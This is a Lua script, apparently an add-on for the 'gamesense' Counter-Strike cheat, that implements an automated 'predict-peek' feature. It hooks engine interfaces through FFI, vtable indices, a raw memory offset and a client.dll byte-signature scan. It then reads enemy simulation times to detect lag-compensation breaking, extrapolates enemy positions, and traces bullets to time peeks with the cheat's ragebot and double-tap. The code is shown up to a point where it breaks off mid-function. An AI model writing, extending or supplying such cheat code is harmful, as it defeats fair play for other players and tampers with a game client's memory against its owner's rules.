local vector = require("vector")
local trace = require("gamesense/trace")
local ffi = require("ffi")
local entitylib = require 'gamesense/entity'
local antiaim_funcs = require("gamesense/antiaim_funcs")

local bit_band, bit_lshift, client_color_log, client_create_interface, client_delay_call, client_find_signature, client_key_state, client_reload_active_scripts, client_screen_size, client_set_event_callback, client_system_time, client_timestamp, client_unset_event_callback, database_read, database_write, entity_get_classname, entity_get_local_player, entity_get_origin, entity_get_player_name, entity_get_prop, entity_get_steam64, entity_is_alive, globals_framecount, globals_realtime, math_ceil, math_floor, math_max, math_min, panorama_loadstring, renderer_gradient, renderer_line, renderer_rectangle, table_concat, table_insert, table_remove, table_sort, ui_get, ui_is_menu_open, ui_mouse_position, ui_new_checkbox, ui_new_color_picker, ui_new_combobox, ui_new_slider, ui_set, ui_set_visible, setmetatable, pairs, error, globals_absoluteframetime, globals_curtime, globals_frametime, globals_maxplayers, globals_tickcount, globals_tickinterval, math_abs, type, pcall, renderer_circle_outline, renderer_load_rgba, renderer_measure_text, renderer_text, renderer_texture, tostring, ui_name, ui_new_button, ui_new_hotkey, ui_new_label, ui_new_listbox, ui_new_textbox, ui_reference, ui_set_callback, ui_update, unpack, tonumber = bit.band, bit.lshift, client.color_log, client.create_interface, client.delay_call, client.find_signature, client.key_state, client.reload_active_scripts, client.screen_size, client.set_event_callback, client.system_time, client.timestamp, client.unset_event_callback, database.read, database.write, entity.get_classname, entity.get_local_player, entity.get_origin, entity.get_player_name, entity.get_prop, entity.get_steam64, entity.is_alive, globals.framecount, globals.realtime, math.ceil, math.floor, math.max, math.min, panorama.loadstring, renderer.gradient, renderer.line, renderer.rectangle, table.concat, table.insert, table.remove, table.sort, ui.get, ui.is_menu_open, ui.mouse_position, ui.new_checkbox, ui.new_color_picker, ui.new_combobox, ui.new_slider, ui.set, ui.set_visible, setmetatable, pairs, error, globals.absoluteframetime, globals.curtime, globals.frametime, globals.maxplayers, globals.tickcount, globals.tickinterval, math.abs, type, pcall, renderer.circle_outline, renderer.load_rgba, renderer.measure_text, renderer.text, renderer.texture, tostring, ui.name, ui.new_button, ui.new_hotkey, ui.new_label, ui.new_listbox, ui.new_textbox, ui.reference, ui.set_callback, ui.update, unpack, tonumber
local entity_get_local_player, entity_is_enemy, entity_get_all, entity_set_prop, entity_is_alive, entity_is_dormant, entity_get_player_name, entity_get_game_rules, entity_get_origin, entity_hitbox_position, entity_get_players, entity_get_prop = entity.get_local_player, entity.is_enemy,  entity.get_all, entity.set_prop, entity.is_alive, entity.is_dormant, entity.get_player_name, entity.get_game_rules, entity.get_origin, entity.hitbox_position, entity.get_players, entity.get_prop
local math_cos, math_sin, math_rad, math_sqrt = math.cos, math.sin, math.rad, math.sqrt
local math_floor = math.floor
local ffi_cdef, ffi_cast, ffi_new = ffi.cdef, ffi.cast, ffi.new
local bit_band, bit_bor, v_interface, v_check = bit.band, bit.bor, {}, {}

local math_cos, math_sin, math_rad, math_sqrt = math.cos, math.sin, math.rad, math.sqrt
v_interface = {
    getClientNumber = vtable_bind("engine.dll", "VEngineClient014", 104, "unsigned int(__thiscall*)(void*)"),
}
v_check = {
    ClientCheck = function()
        -- print(getClientNumber) --> client check, 2023/1/17 (13850)
        if v_interface.getClientNumber() >= 13856 and v_interface.getClientNumber() <= 13865 then error("interface corrput #1") end
    end,
}
--v_check.ClientCheck()

local function contains(tbl, val)
    for i = 1, #tbl do
        if tbl[i] == val then
            return true
        end
    end
    return false
end

local config = {

    key = ui.new_hotkey("MISC", "Movement", "Predict-Peek"),

    applier = ui.new_multiselect(
        "MISC",
        "Movement",
        "Extra applier",
        "Force defensive"
    ),

    retreat = ui.new_hotkey("MISC", "Movement", "Force Retreat"),

    ignore = ui.new_checkbox("MISC", "Movement", "Ignore teammate", true),

    visuals = ui.new_multiselect(
        "MISC", "Movement",
        "Visuals",
        "Indicator",
        "Circle",
        "Beam",
        "Retreat Circle"
    ),

    forcebot = ui.new_multiselect(
        "MISC", "Movement", "Force Prompt",
        "Force wait for recharge", "Force stand up to peek"
    ),

    glow_enabled = ui.new_checkbox("MISC", "Movement", "Glow Enabled"),
    glow_radius = ui.new_slider("MISC", "Movement", "Glow Radius", 0, 8, 1, true, "°"),

    colors = {
        Label_a = ui_new_label( "MISC", "Movement", "color1" ),
        c_a = ui_new_color_picker( "MISC", "Movement", " 1", 184, 187, 230, 230),
        Label_b = ui_new_label( "MISC", "Movement", "color2" ),
        c_b = ui_new_color_picker( "MISC", "Movement", " 2", 134, 137, 180, 80),
    },

    response = ui.new_combobox(
        "MISC",
        "Movement",
        "Autopeek response",
        "Medium",
        "Fast(danger)",
        "Slow"
    ),

    hitscan = ui.new_multiselect("MISC", "Movement", "Additional hitscan", "Arms", "Legs"),
    trace_debug = ui.new_checkbox("MISC", "Movement", "Tracing debugger"),

    adavance = ui.new_checkbox("MISC", "Movement", "Enable Auto-peek Advance settings"),

    manual_toggle = ui.new_combobox(
        "MISC",
        "Movement",
        "Autopeek based",
        "Bind with quick peek assist",
        "Manual key bind"
    ),

    activate = ui.new_hotkey("MISC", "Movement", "[Manual] Autopeek key"),

    peekbot_polart = ui.new_checkbox("MISC", "Movement", "Enable Individuals peek sets"),

    autopeek_sets_manual = ui.new_multiselect(
        "MISC",
        "Movement",
        "Human quick peek assist mode:",
        "Retreat on shot",
        "Retreat on key release"
    ),

    autopeek_sets_bot = ui.new_multiselect(
        "MISC",
        "Movement",
        "Bot quick peek assist mode:",
        "Retreat on shot",
        "Retreat on key release"
    ),

    trace_reference = ui.new_combobox(
        "MISC",
        "Movement",
        "Tracing reference",
        "Rage Bot Damage",
        "Manual Damage"
    ),

    damage_radius = ui.new_slider("MISC", "Movement", "Damage", 1, 100, 20, true, ""),

    back_track = ui.new_hotkey("MISC", "Movement", "Force Backtrack"),

    safe_peek = ui.new_hotkey("MISC", "Movement", "Safe Peek"),

    prediction = ui.new_multiselect(
        "MISC",
        "Movement",
        "Enemy:",
        "Backtrack",
        "Teleport"
    ),

    -----------------------not done

    range = ui.new_slider("MISC", "Movement", "Peeking Range",  5, 150, 60, true, "ft"),
    frequent = ui.new_slider("MISC", "Movement", "Detection Frequence",  5, 150, 35, true, "per"),


    radius = ui.new_slider("MISC", "Movement", "Force retreat radius",  1, 120, 30, true, ""),

    detection =
    ui.new_combobox(
        "MISC",
        "Movement",
        "Tracing Method",
        "Fraction (low fps)",
        "Damage (high fps)"
    ),
  


}


local vector = require 'vector'
local solus_render = (function()
    local solus_m = {}
    local RoundedRect = function(x, y, width, height, radius, r, g, b, a)
        renderer.rectangle(x + radius, y, width - radius * 2, radius, r, g, b, a)
        renderer.rectangle(x, y + radius, radius, height - radius * 2, r, g, b, a)
        renderer.rectangle(x + radius, y + height - radius, width - radius * 2, radius, r, g, b, a)
        renderer.rectangle(x + width - radius, y + radius, radius, height - radius * 2, r, g, b, a)
        renderer.rectangle(x + radius, y + radius, width - radius * 2, height - radius * 2, r, g, b, a)
        renderer.circle(x + radius, y + radius, r, g, b, a, radius, 180, 0.25)
        renderer.circle(x + width - radius, y + radius, r, g, b, a, radius, 90, 0.25)
        renderer.circle(x + radius, y + height - radius, r, g, b, a, radius, 270, 0.25)
        renderer.circle(x + width - radius, y + height - radius, r, g, b, a, radius, 0, 0.25)
    end
    local rounding = 4
    local rad = rounding + 2
    local n = 45
    local o = 20
    local OutlineGlow = function(x, y, w, h, radius, r, g, b, a)
        renderer.rectangle(x + 2, y + radius + rad, 1, h - rad * 2 - radius * 2, r, g, b, a)
        renderer.rectangle(x + w - 3, y + radius + rad, 1, h - rad * 2 - radius * 2, r, g, b, a)
        renderer.rectangle(x + radius + rad, y + 2, w - rad * 2 - radius * 2, 1, r, g, b, a)
        renderer.rectangle(x + radius + rad, y + h - 3, w - rad * 2 - radius * 2, 1, r, g, b, a)
        renderer.circle_outline(x + radius + rad, y + radius + rad, r, g, b, a, radius + rounding, 180, 0.25, 1)
        renderer.circle_outline(x + w - radius - rad, y + radius + rad, r, g, b, a, radius + rounding, 270, 0.25, 1)
        renderer.circle_outline(x + radius + rad, y + h - radius - rad, r, g, b, a, radius + rounding, 90, 0.25, 1)
        renderer.circle_outline(x + w - radius - rad, y + h - radius - rad, r, g, b, a, radius + rounding, 0, 0.25, 1)
    end
    local FadedRoundedRect = function(x, y, w, h, radius, r, g, b, a, glow)
        local n = a / 255 * n
        renderer.rectangle(x + radius, y, w - radius * 2, 1, r, g, b, a)
        renderer.circle_outline(x + radius, y + radius, r, g, b, a, radius, 180, 0.25, 1)
        renderer.circle_outline(x + w - radius, y + radius, r, g, b, a, radius, 270, 0.25, 1)
        renderer.gradient(x, y + radius, 1, h - radius * 2, r, g, b, a, r, g, b, n, false)
        renderer.gradient(x + w - 1, y + radius, 1, h - radius * 2, r, g, b, a, r, g, b, n, false)
        renderer.circle_outline(x + radius, y + h - radius, r, g, b, n, radius, 90, 0.25, 1)
        renderer.circle_outline(x + w - radius, y + h - radius, r, g, b, n, radius, 0, 0.25, 1)
        renderer.rectangle(x + radius, y + h - 1, w - radius * 2, 1, r, g, b, n)
        if ui_get(config.glow_enabled) then
            for radius = 4, glow do
                local radius = radius / 2
                OutlineGlow(x - radius, y - radius, w + radius * 2, h + radius * 2, radius, r, g, b, glow - radius * 2)
            end
        end
    end
    local HorizontalFadedRoundedRect = function(x, y, w, h, radius, r, g, b, a, glow, r1, g1, b1)
        local n = a / 255 * n
        renderer.rectangle(x, y + radius, 1, h - radius * 2, r, g, b, a)
        renderer.circle_outline(x + radius, y + radius, r, g, b, a, radius, 180, 0.25, 1)
        renderer.circle_outline(x + radius, y + h - radius, r, g, b, a, radius, 90, 0.25, 1)
        renderer.gradient(x + radius, y, w / 3.5 - radius * 2, 1, r, g, b, a, 0, 0, 0, n / 0, true)
        renderer.gradient(x + radius, y + h - 1, w / 3.5 - radius * 2, 1, r, g, b, a, 0, 0, 0, n / 0, true)
        renderer.rectangle(x + radius, y + h - 1, w - radius * 2, 1, r1, g1, b1, n)
        renderer.rectangle(x + radius, y, w - radius * 2, 1, r1, g1, b1, n)
        renderer.circle_outline(x + w - radius, y + radius, r1, g1, b1, n, radius, -90, 0.25, 1)
        renderer.circle_outline(x + w - radius, y + h - radius, r1, g1, b1, n, radius, 0, 0.25, 1)
        renderer.rectangle(x + w - 1, y + radius, 1, h - radius * 2, r1, g1, b1, n)
        if ui_get(config.glow_enabled) then
            for radius = 4, glow do
                local radius = radius / 2
                OutlineGlow(
                    x - radius,
                    y - radius,
                    w + radius * 2,
                    h + radius * 2,
                    radius,
                    r1,
                    g1,
                    b1,
                    glow - radius * 2
                )
            end
        end
    end
    local FadedRoundedGlow = function(x, y, w, h, radius, r, g, b, a, glow, r1, g1, b1)
        local n = a / 255 * n
        renderer.rectangle(x + radius, y, w - radius * 2, 1, r, g, b, n)
        renderer.circle_outline(x + radius, y + radius, r, g, b, n, radius, 180, 0.25, 1)
        renderer.circle_outline(x + w - radius, y + radius, r, g, b, n, radius, 270, 0.25, 1)
        renderer.rectangle(x, y + radius, 1, h - radius * 2, r, g, b, n)
        renderer.rectangle(x + w - 1, y + radius, 1, h - radius * 2, r, g, b, n)
        renderer.circle_outline(x + radius, y + h - radius, r, g, b, n, radius, 90, 0.25, 1)
        renderer.circle_outline(x + w - radius, y + h - radius, r, g, b, n, radius, 0, 0.25, 1)
        renderer.rectangle(x + radius, y + h - 1, w - radius * 2, 1, r, g, b, n)
        if ui_get(config.glow_enabled) then
            for radius = 4, glow do
                local radius = radius / 2
                OutlineGlow(x - radius, y - radius, w + radius * 2, h + radius * 2, radius, r1, g1, b1, glow - radius * 2)
            end
        end
    end
    solus_m.linear_interpolation = function(start, _end, time)
        return (_end - start) * time + start
    end
    solus_m.clamp = function(value, minimum, maximum)
        if minimum > maximum then
            return math.min(math.max(value, maximum), minimum)
        else
            return math.min(math.max(value, minimum), maximum)
        end
    end
    solus_m.lerp = function(start, _end, time)
        time = time or 0.005
        time = solus_m.clamp(globals.frametime() * time * 175.0, 0.01, 1.0)
        local a = solus_m.linear_interpolation(start, _end, time)
        if _end == 0.0 and a < 0.01 and a > -0.01 then
            a = 0.0
        elseif _end == 1.0 and a < 1.01 and a > 0.99 then
            a = 1.0
        end
        return a
    end
    solus_m.container = function(x, y, w, h, r, g, b, a, alpha, br, bg, bb, ba, fn)
        if alpha * 255 > 0 then
            renderer.blur(x, y, w, h)
        end
        RoundedRect(x, y, w, h, rounding, br, bg, bb, ba)
        FadedRoundedRect(x, y, w, h, rounding, r, g, b, alpha * 255, alpha * o)
        if not fn then
            return
        end
        fn(x + rounding, y + rounding, w - rounding * 2, h - rounding * 2.0)
    end
    solus_m.horizontal_container = function(x, y, w, h, r, g, b, a, alpha, r1, g1, b1, fn)
        if alpha * 255 > 0 then
            renderer.blur(x, y, w, h)
        end
        RoundedRect(x, y, w, h, rounding, 17, 17, 17, a)
        HorizontalFadedRoundedRect(x, y, w, h, rounding, r, g, b, alpha * 255, alpha * o, r1, g1, b1)
        if not fn then
            return
        end
        fn(x + rounding, y + rounding, w - rounding * 2, h - rounding * 2.0)
    end
    solus_m.container_glow = function(x, y, w, h, r, g, b, a, alpha, r1, g1, b1, fn)
        if alpha * 255 > 0 then
            renderer.blur(x, y, w, h)
        end
        RoundedRect(x, y, w, h, rounding, 17, 17, 17, a)
        FadedRoundedGlow(x, y, w, h, rounding, r, g, b, alpha * 255, alpha * o, r1, g1, b1)
        if not fn then
            return
        end
        fn(x + rounding, y + rounding, w - rounding * 2, h - rounding * 2.0)
    end
    solus_m.measure_multitext = function(flags, _table)
        local a = 0
        for b, c in pairs(_table) do
            c.flags = c.flags or ""
            a = a + renderer.measure_text(c.flags, c.text)
        end
        return a
    end
    solus_m.multitext = function(x, y, _table)
        for a, b in pairs(_table) do
            b.flags = b.flags or ""
            b.limit = b.limit or 0
            b.color = b.color or {255, 255, 255, 255}
            b.color[4] = b.color[4] or 255
            renderer.text(x, y, b.color[1], b.color[2], b.color[3], b.color[4], b.flags, b.limit, b.text)
            x = x + renderer.measure_text(b.flags, b.text)
        end
    end
    return solus_m
end)()




---------------------Polygens
function angle_forward(angle)
    local sin_pitch = math.sin(math.rad(angle.x))
    local cos_pitch = math.cos(math.rad(angle.x))
    local sin_yaw   = math.sin(math.rad(angle.y))
    local cos_yaw   = math.cos(math.rad(angle.y))

    return vector(cos_pitch * cos_yaw, cos_pitch * sin_yaw, -sin_pitch)
end

function angle_right( angle )
    local sin_pitch = math.sin( math.rad( angle.x ) );
    local cos_pitch = math.cos( math.rad( angle.x ) );
    local sin_yaw   = math.sin( math.rad( angle.y ) );
    local cos_yaw   = math.cos( math.rad( angle.y ) );
    local sin_roll  = math.sin( math.rad( angle.z ) );
    local cos_roll  = math.cos( math.rad( angle.z ) );

    return vector(
        -1.0 * sin_roll * sin_pitch * cos_yaw + -1.0 * cos_roll * -sin_yaw,
        -1.0 * sin_roll * sin_pitch * sin_yaw + -1.0 * cos_roll * cos_yaw,
        -1.0 * sin_roll * cos_pitch
    );
end


function vecotr_ma(start, scale, direction_x, direction_y, direction_z)
    return vector(start.x + scale * direction_x, start.y + scale * direction_y, start.z + scale * direction_z)
end

pClientEntityList = client.create_interface("client_panorama.dll", "VClientEntityList003") or error("invalid interface", 2)
fnGetClientEntity = vtable_thunk(3, "void*(__thiscall*)(void*, int)")

ffi.cdef('typedef struct { float x; float y; float z; } bbvec3_t;')

local fnGetAttachment = vtable_thunk(84, "bool(__thiscall*)(void*, int, bbvec3_t&)")
local fnGetMuzzleAttachmentIndex1stPerson = vtable_thunk(468, "int(__thiscall*)(void*, void*)")
local fnGetMuzzleAttachmentIndex3stPerson = vtable_thunk(469, "int(__thiscall*)(void*)")

local get_attachment_vector = function(world_model)
    local me = entity.get_local_player()
    local wpn = entity.get_player_weapon(me)

    local model =
        world_model and 
        entity.get_prop(wpn, 'm_hWeaponWorldModel') or
        entity.get_prop(me, 'm_hViewModel[0]')

    if me == nil or wpn == nil then
        return
    end

    local active_weapon = fnGetClientEntity(pClientEntityList, wpn)
    local g_model = fnGetClientEntity(pClientEntityList, model)

    if active_weapon == nil or g_model == nil then
        return
    end

    local attachment_vector = ffi.new("bbvec3_t[1]")
    local att_index = world_model and
        fnGetMuzzleAttachmentIndex3stPerson(active_weapon) or
        fnGetMuzzleAttachmentIndex1stPerson(active_weapon, g_model)

    if att_index > 0 and fnGetAttachment(g_model, att_index, attachment_vector[0]) and not nil then 
        return { attachment_vector[0].x, attachment_vector[0].y, attachment_vector[0].z }
    end
end

local renderer_circle = renderer.circle

--------------------------Webhooks------------------------

--------------------------Libary ends------------------------


local function menu_visible()
    local enabled = ui.get(config.adavance)
    local manual = (ui.get(config.manual_toggle) == "Manual key bind")
    local Indicator = contains(ui.get(config.visuals), "Indicator")
    local polart = (ui.get(config.peekbot_polart))
    local rage_dmg = (ui.get(config.trace_reference) == "Manual Damage") 

    ui.set_visible(config.manual_toggle, enabled)
    ui.set_visible(config.activate, enabled and manual)

    ui.set_visible(config.autopeek_sets_manual, polart)
    ui.set_visible(config.autopeek_sets_bot, polart)

    ui.set_visible(config.colors.Label_a, Indicator)
    ui.set_visible(config.colors.c_a, Indicator)
    ui.set_visible(config.colors.Label_b, Indicator)
    ui.set_visible(config.colors.c_b, Indicator)
    ui.set_visible(config.glow_enabled, Indicator)
    ui.set_visible(config.glow_radius, Indicator)

    ui.set_visible(config.back_track, enabled)
    ui.set_visible(config.safe_peek, enabled)
    ui.set_visible(config.back_track, enabled)
    ui.set_visible(config.detection, enabled)
    ui.set_visible(config.prediction, enabled)
    ui.set_visible(config.range, enabled)
    ui.set_visible(config.frequent, enabled)
    ui.set_visible(config.radius, enabled)

    ui.set_visible(config.damage_radius, rage_dmg)
end

menu_visible()

client.set_event_callback('paint_ui', menu_visible)
----------------------------[[Movement]]----------------------------
local function velocity()
    local me = entity_get_local_player()
    local velocity_x, velocity_y = entity_get_prop(me, "m_vecVelocity")
    return math.sqrt(velocity_x ^ 2 + velocity_y ^ 2)
end

local tickbase_max, tickbase_diff
local function reset_tp()
    local double_tap, double_tap_key = ui.reference('Rage', 'Aimbot','Double tap')
    tickbase_max, tickbase_diff = nil, nil
    ui.set(double_tap_key, 'Toggle')    
end

---------------------------[[Camera libary]]-----------------------

local pi = 3.14159265358979323846
local function d2r(value)
	return value * (pi / 180)
end

local function vectorangle(x,y,z)
	local fwd_x, fwd_y, fwd_z
	local sp, sy, cp, cy
	
	sy = math.sin(d2r(y))
	cy = math.cos(d2r(y))
	sp = math.sin(d2r(x))
	cp = math.cos(d2r(x))
	fwd_x = cp * cy
	fwd_y = cp * sy
	fwd_z = -sp
	return fwd_x, fwd_y, fwd_z
end

local function multiplyvalues(x,y,z,val)
	x = x * val y = y * val z = z * val
	return x, y, z
end

-----------------Your camera position
local function camera(radius, range)
    local local_player = entity.get_local_player()
    local eyepos_x, eyepos_y, eyepos_z = client.eye_position()
	local offsetx, offsety, offsetz = entity_get_prop(local_player, "m_vecViewOffset")
    local cpitch, cyaw = client.camera_angles()
    local fwdx, fwdy, fwdz = vectorangle(0, cyaw + radius, 0)
    fwdx, fwdy, fwdz = multiplyvalues(fwdx,fwdy,fwdz, range)
    local a_vector = vector(eyepos_x + fwdx,eyepos_y + fwdy,eyepos_z + fwdz)
    local origin = vector(entity_get_origin(local_player))
    return a_vector
end

-----------------Gives the last position when it hit walls
local function endpos(origin, dest)

    local teammates = {}

    local local_player = entity.get_local_player()
    local ignore = ui.get(config.ignore)

    if not ignore then
        for _, entindex in ipairs(entity.get_players()) do
            if not entity.is_enemy(entindex) then
                teammates[#teammates + 1] = entindex
            end
        end

        local tr = trace.line(origin, dest, { skip = teammates })
        local endpos = tr.end_pos return endpos
    else
        local adt = trace.line(origin, dest, { skip = local_player })
        local endpos_adt = adt.end_pos return endpos_adt
    end
end

-----------------------[[Predict Enemy's movement]]-----------------------

local predict_ticks = 17

local g_origin = {}
local g_lc = {}

-----------------------Detecting is Enemy breaking lag comp-----------------------

local GetClientEntity = vtable_bind("client_panorama.dll", "VClientEntityList003", 3, "void*(__thiscall*)(void*, int)")

local function breaking_lc(ent)
    local Entity = GetClientEntity(ent)
    local m_flOldSimulationTime = ffi.cast("float*", ffi.cast("uintptr_t", Entity) + 0x26C)[0]
    local m_flSimulationTime = entity.get_prop(ent, "m_flSimulationTime")
    if m_flSimulationTime - m_flOldSimulationTime == 0 then
        return g_lc[ent]
    end
    
    local origin = vector(entity.get_origin(ent))
    g_origin[ent] = g_origin[ent] or origin
    if entity.is_dormant(ent) or not entity.is_alive(ent) then
        return false
    end

    if m_flSimulationTime < m_flOldSimulationTime then
        return true
    end

    if (origin - g_origin[ent]):lengthsqr() > 4096 then
        g_origin[ent] = origin
        return true
    end

    g_origin[ent] = origin
    return false 
end

-----------------------Extrapolate position
local function ExtrapolatePosition(pos, vel, ticks)
    local vecFinalPosition = pos:scaled(1) -- copy pos to vecFinalPosition
    local flTickInterval = globals_tickinterval()
    local FinalTicksLimitation = flTickInterval * ticks * vel

    vecFinalPosition.x = vecFinalPosition.x + FinalTicksLimitation.x
    vecFinalPosition.y = vecFinalPosition.y + FinalTicksLimitation.y
    vecFinalPosition.z = vecFinalPosition.z

    return vecFinalPosition
end

-----------------------Distance 3d measurement
local function distance_3d( origin, target )
    return math.sqrt( ( origin.x - target.x )*( origin.x - target.x )+( origin.y - target.y )*( origin.y - target.y ) )
end

-----------------------Figure is enemy peeking
local function is_enemy_peeking( player )
    local velocity = vector(entity_get_prop(player, "m_vecVelocity"))
    local enemy = vector(entity.hitbox_position(player, 5))
    local origin = vector(entity.get_origin( entity.get_local_player ( ) ))
    local start_distance = math.abs( distance_3d( origin, enemy ) )
    local smallest_distance = 999999
    for ticks = 1, predict_ticks do
        local Extrapolate = ExtrapolatePosition( origin, velocity, ticks )
        
        local distance = math.abs(distance_3d(Extrapolate, enemy))

        if distance < smallest_distance then
            smallest_distance = distance
        end
        if smallest_distance < start_distance then
            return true
        end
    end
    return smallest_distance < start_distance
end

local function prediction(player_index, hitscan)

    local ref_target_selection = ui_reference("RAGE", "Aimbot", "Target hitbox")
    local target = ui.get(ref_target_selection)
    local head = #target == 1 and contains(ui.get(ref_target_selection), "Head") 
    local fast = (ui.get(config.response) == "Fast(danger)")
    local medium = (ui.get(config.response) == "Medium")
    local slow = (ui.get(config.response) == "Slow")

    local Responses = (hitscan == nil and (head and 0) or (fast and 8) or (medium and 3) or (slow and 5)) or hitscan
    local pos = vector(entity.hitbox_position(player_index, Responses))
    local velocity = vector(entity_get_prop(player_index, "m_vecVelocity"))

    if contains(ui.get(config.prediction), "Backtrack") then
        pos = ExtrapolatePosition(pos, velocity, -3)
    end
    --center_x, center_y = renderer.world_to_screen(pos.x, pos.y, pos.z)
    --renderer.text(center_x, center_y, 255, 255, 255, 255, "+c", nil, "+")

    return pos
end
-----------------------[[Fraction detection libary]]-----------------------

----------------Detecting is the enemy can be hit
local function fraction_detection(player_index, origin_pos, enemy_pos, tracing)
    local local_player = entity.get_local_player()
    -----------------------Get local player
    local fraction_left_te = client.trace_line(player_index, origin_pos.x, origin_pos.y, origin_pos.z, enemy_pos.x, enemy_pos.y, enemy_pos.z)
    local entindex_1, dmg = client.trace_bullet(local_player, origin_pos.x, origin_pos.y, origin_pos.z, enemy_pos.x, enemy_pos.y, enemy_pos.z) 
    local damage = ui.reference("RAGE", "Aimbot", "Minimum damage")
    local damage_manual = ui.get(config.damage_radius)
    local rage_dmg = (ui.get(config.trace_reference) == "Rage Bot Damage" and ui.get(damage)) or
                    (ui.get(config.trace_reference) == "Manual Damage" and damage_manual)


    local is_whitelist = plist.get(player_index, "Add to whitelist")

    if not is_whitelist then
        if tracing then
            if fraction_left_te == 1 then return dmg - 2, 4 end
            if dmg > rage_dmg then return dmg - 2, 2 end
        end
    end
    return 0, 1
end

------------Guess Maybe for low fps user
local function damage_detection(player_index, origin_pos, enemy_pos, tracing)
    local local_player = entity.get_local_player()
    local origin = vector(entity_get_origin(local_player))
    -----------------------Get local player
    local entindex_1, dmg = client.trace_bullet(local_player, origin_pos.x, origin_pos.y, origin_pos.z, enemy_pos.x, enemy_pos.y, enemy_pos.z) 
    local is_whitelist = plist.get(player_index, "Add to whitelist")
    if not is_whitelist then
        if tracing then
            if dmg > 0 then return dmg, 4 end
            return 0, 1
        end
    end
end
--------------------------[[Render libary]]-----------------------

----------------Beam function
ffi_cdef[[
    struct beam_t
    {
        int m_nType;
        void* m_pStartEnt;
        int m_nStartAttachment;
        void* m_pEndEnt;
        int m_nEndAttachment;
        Vector m_vecStart;
        Vector m_vecEnd;
        int m_nModelIndex;
        const char* m_pszModelName;
        int m_nHaloIndex;
        const char* m_pszHaloName;
        float m_flHaloScale;
        float m_flLife;
        float m_flWidth;
        float m_flEndWidth;
        float m_flFadeLength;
        float m_flAmplitude;
        float m_flBrightness;
        float m_flSpeed;
        int m_nStartFrame;
        float m_flFrameRate;
        float m_flRed;
        float m_flGreen;
        float m_flBlue;
        bool m_bRenderable;
        int m_nSegments;
        int m_nFlags;
        Vector m_vecCenter;
        float m_flStartRadius;
        float m_flEndRadius;
    };
]]

local BBoxSize = {
    vector(-10.0, 10.0, 2.0),
    vector(10.0, 10.0, 2.0),
    vector(-10.0, -10.0, 2.0),
    vector(10.0, -10.0, 2.0),
}

local g_ViewRenderBeams_Address = client_find_signature("client.dll", "\xB9\xCC\xCC\xCC\xCC\xA1\xCC\xCC\xCC\xCC\xFF\x10\xA1\xCC\xCC\xCC\xCC\xB9") or error("g_ViewRenderBeams_Address is outdated")
local g_pViewRenderBeams = ffi_cast("void***", ffi_cast("void**", ffi_cast("char*", g_ViewRenderBeams_Address) + 1)[0])

local DrawBeams = ffi_cast("void(__thiscall*)(void*, void*)", g_pViewRenderBeams[0][6])
local CreateBeamPoints = ffi_cast("void*(__thiscall*)(void*, struct beam_t&)", g_pViewRenderBeams[0][12])

local function RenderBeam(start_pos, end_pos, r, g, b, a)


    local beamInfo = ffi.new("struct beam_t")

    beamInfo.m_vecStart = start_pos
    beamInfo.m_vecEnd = end_pos
    beamInfo.m_nSegments = 2
    beamInfo.m_nType = 0x00
    beamInfo.m_bRenderable = true
    beamInfo.m_nFlags = bit_bor(0x00000100 + 0x00000008 + 0x00000200 + 0x00008000)
    beamInfo.m_pszModelName = "sprites/physbeam.vmt"
    beamInfo.m_nModelIndex = -1
    beamInfo.m_flHaloScale = 0.0
    beamInfo.m_nStartAttachment = 0
    beamInfo.m_nEndAttachment = 0
    beamInfo.m_flLife = 0.05
    beamInfo.m_flWidth = 2
    beamInfo.m_flEndWidth = 1.0
    beamInfo.m_flFadeLength = 0.0
    beamInfo.m_flAmplitude = 0.0
    beamInfo.m_flSpeed = 0
    beamInfo.m_flFrameRate = 0.0
    beamInfo.m_nHaloIndex = 0
    beamInfo.m_nStartFrame = 0
    beamInfo.m_flRed = r
    beamInfo.m_flGreen = g
    beamInfo.m_flBlue = b
    beamInfo.m_flBrightness = a

    local beam = CreateBeamPoints(g_pViewRenderBeams, beamInfo)

    if beam ~= nil then
        DrawBeams(g_pViewRenderBeams, beam)
    end

end

local function beam_creator(o_pos, r, g, b, a)
    local pos = vector(o_pos.x, o_pos.y, o_pos.z)
    local tl = pos + BBoxSize[1]
    local tr = pos + BBoxSize[2]
    local bl = pos + BBoxSize[3]
    local br = pos + BBoxSize[4]

    RenderBeam(tl, tr, r, g, b, a)
    RenderBeam(tl, bl, r, g, b, a)
    RenderBeam(bl, br, r, g, b, a)
    RenderBeam(tr, br, r, g, b, a)
end

----------------Rendering 3d circle
local function draw_circle_3d(x, y, z, radius, r, g, b, a, accuracy, width, outline, start_degrees, percentage, fill_r, fill_g, fill_b, fill_a)

	local accuracy = accuracy ~= nil and accuracy or 3
	local width = width ~= nil and width or 1
	local outline = outline ~= nil and outline or false
	local start_degrees = start_degrees ~= nil and start_degrees or 0
	local percentage = percentage ~= nil and percentage or 1

	local center_x, center_y
	if fill_a then
		center_x, center_y = renderer.world_to_screen(x, y, z)
	end

	local screen_x_line_old, screen_y_line_old
	for rot=start_degrees, percentage*360, accuracy do
		local rot_temp = math.rad(rot)
		local lineX, lineY, lineZ = radius * math.cos(rot_temp) + x, radius * math.sin(rot_temp) + y, z
		local screen_x_line, screen_y_line = renderer.world_to_screen(lineX, lineY, lineZ)
		if screen_x_line ~=nil and screen_x_line_old ~= nil then
			if fill_a and center_x ~= nil then
				renderer.triangle(screen_x_line, screen_y_line, screen_x_line_old, screen_y_line_old, center_x, center_y, fill_r, fill_g, fill_b, fill_a)
			end
			for i=1, width do
				local i=i-1
				renderer.line(screen_x_line, screen_y_line-i, screen_x_line_old, screen_y_line_old-i, r, g, b, a)
				renderer.line(screen_x_line-1, screen_y_line, screen_x_line_old-i, screen_y_line_old, r, g, b, a)
			end
			if outline then
				local outline_a = a/255*160
				renderer.line(screen_x_line, screen_y_line-width, screen_x_line_old, screen_y_line_old-width, 16, 16, 16, outline_a)
				renderer.line(screen_x_line, screen_y_line+1, screen_x_line_old, screen_y_line_old+1, 16, 16, 16, outline_a)
			end
		end
		screen_x_line_old, screen_y_line_old = screen_x_line, screen_y_line
	end
end

-----------------better render circle
local function circle_drawer_re(pos, radius, r, g, b, a)
    local local_player = entity.get_local_player()
    local origin = vector(entity_get_origin(local_player))

    draw_circle_3d(pos.x, pos.y, pos.z, radius, 255, 255, 255, 255, 3, 2, false, 0, 1, r, g, b, a)
end

--------------------------[[Detecting fire event]]--------------------------

local afire = 0
local time_to_shot = 0

local function tts()

    local local_player = entity.get_local_player()
    if not entity_is_alive(local_player) then return end
    
    local local_player_weapon = entity.get_player_weapon(local_player)
    local local_player = entity_get_local_player()

    local cur = globals.curtime()
